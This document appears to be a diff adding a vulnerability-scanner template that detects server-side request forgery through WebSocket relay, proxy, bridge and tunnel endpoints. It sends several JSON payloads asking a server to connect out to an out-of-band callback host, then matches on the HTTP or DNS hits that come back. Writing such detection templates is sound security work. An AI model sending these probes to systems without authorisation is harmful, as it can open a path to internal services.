@@ -1,0 +1,95 @@
+id: websocket-relay-oob
+
+info:
+  name: WebSocket Message Relay OOB Detection
+  author: geeknik
+  severity: high
+  description: |
+    Detects WebSocket endpoints that relay or proxy messages to external services,
+    potentially allowing SSRF through WebSocket message forwarding, bridge connections,
+    or relay functionality that can be abused to reach internal services.
+  reference:
+    - https://portswigger.net/web-security/websockets/what-are-websockets
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
+    cvss-score: 8.2
+    cwe-id: CWE-918
+  tags: websocket,oob,ssrf,relay,proxy,bridge
+
+variables:
+  callback_url: "{{interactsh-url}}"
+
+websocket:
+  - address: "{{BaseURL}}"
+    path:
+      - "/ws"
+      - "/websocket"
+      - "/socket.io/"
+      - "/api/ws"
+      - "/bridge"
+      - "/tunnel"
+
+    inputs:
+      - data: |
+          {
+            "type": "relay",
+            "target": "{{callback_url}}",
+            "relay_to": "{{callback_url}}/endpoint",
+            "forward_url": "{{callback_url}}/webhook"
+          }
+      - data: |
+          {
+            "action": "message_relay",
+            "relay_config": {
+              "url": "{{callback_url}}",
+              "method": "GET",
+              "headers": {"User-Agent": "WebSocket-Relay"}
+            }
+          }
+      - data: |
+          {
+            "command": "bridge_setup",
+            "bridge_config": {
+              "upstream": "{{callback_url}}",
+              "downstream": "ws://{{callback_url}}/ws",
+              "proxy_headers": true
+            }
+          }
+
+  - address: "{{BaseURL}}"
+    path:
+      - "/ws/proxy"
+      - "/websocket/forward"
+      - "/api/ws/tunnel"
+
+    inputs:
+      - data: |
+          {
+            "type": "proxy_config",
+            "proxy_target": "{{callback_url}}",
+            "webhook_url": "{{callback_url}}/callback",
+            "forward_all": true,
+            "external_relay": "{{callback_url}}/relay"
+          }
+      - data: |
+          {
+            "action": "external_connect",
+            "external_ws": "wss://{{callback_url}}/ws",
+            "relay_messages": true,
+            "callback_on_connect": "{{callback_url}}/connected"
+          }
+      - data: |
+          {
+            "command": "tunnel_create",
+            "tunnel_target": "{{callback_url}}",
+            "callback_url": "{{callback_url}}/tunnel-ready"
+          }
+
+matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+      - "http"
+      - "dns"
+    condition: or
